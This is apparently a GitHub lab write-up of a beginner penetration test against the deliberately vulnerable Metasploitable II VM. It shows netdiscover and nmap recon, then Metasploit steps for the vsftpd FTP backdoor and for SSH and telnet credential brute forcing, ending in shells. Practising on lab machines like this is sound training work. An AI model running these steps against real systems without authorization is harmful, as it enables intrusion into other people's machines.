# Port Exploitation 

### Introduction
#### Purpose of the Report
This walk-through demonstrates how to identify vulnerabilities, exploit them, and gain access to the Metasplotable II, using penetration testing tools.

#### Target Machine
Metasploitable II — intentionally vulnerable Linux VM used for practicing and learning.

#### Attack Machine
Kali Linux

#### Tools used
- netdiscover
- nmap
- metasploit framework

### Recon Stage 
#### Host Discovery
used netdiscover to scan and identify live hosts on the network. Purpose of this tool is to show all the devices that are currently connected to this network.

"sudo netdiscover"

<img width="720" height="459" alt="image" src="https://github.com/user-attachments/assets/ec976a39-4f44-430b-9193-cd4e468e55ac" />

#### Network discovery
used nmap to scan the network and identify operating system and services running on the operating system.

"nmap -O -sV 192.168.1.81"
##### Important open ports found :
<img width="720" height="405" alt="image" src="https://github.com/user-attachments/assets/478fbf33-6e08-4ea8-8f36-931816df3a9c" />

#### Exploitation stage
used metasploit for port exploitation.

##### FTP port Exploitation
- Search vstp
- use 1
- options
- set RHOSTS "put IP here"
- options #for confirmation
- exploit
<img width="720" height="405" alt="image" src="https://github.com/user-attachments/assets/c24a1f65-63ea-43df-9ab5-2c7e1a8ab1f0" />

<img width="720" height="405" alt="image" src="https://github.com/user-attachments/assets/27bd1747-56c0-44d6-b293-b60721ef1d6f" />

<img width="720" height="405" alt="image" src="https://github.com/user-attachments/assets/4985e981-97bc-4b22-8069-f934899676fc" />

##### SSH port Exploitation
- search for open_ssh
- use 0
- options
- set RHOSTS #put IP here
- set user_file
- set pass_file
- option #to verify
- run

<img width="720" height="405" alt="image" src="https://github.com/user-attachments/assets/8e477afe-30ac-4564-8aa0-5210663c064a" />

at the end we found the shell through which we can compromise the system as the way we want.
<img width="720" height="405" alt="image" src="https://github.com/user-attachments/assets/04dd4af2-ad2a-4712-b77c-de544fe412ff" />

##### Telnet port exploitation
- look for telnet_login_scan
- use 76
- options
- set RHOSTS
- set file for brute forcing
- run
<img width="720" height="405" alt="image" src="https://github.com/user-attachments/assets/4ac59b5d-981c-4dfd-9c19-c071146faeb3" />

#### found the shell....taadaaaaaa
